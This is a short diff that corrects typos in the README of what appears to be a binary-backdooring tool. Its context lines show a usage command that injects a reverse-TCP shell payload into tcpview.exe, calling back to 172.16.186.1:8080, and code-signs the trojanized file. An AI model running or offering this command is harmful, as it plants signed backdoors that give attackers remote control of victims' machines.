@@ -244,7 +244,7 @@ Your certs/ directory should look excatly as so:
     ├── signingPrivateKey.pem
     └── signingCert.cer
 
-Enable PE Code Signing with the -C floag as so:
+Enable PE Code Signing with the -C flag as so:
 
      ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
 
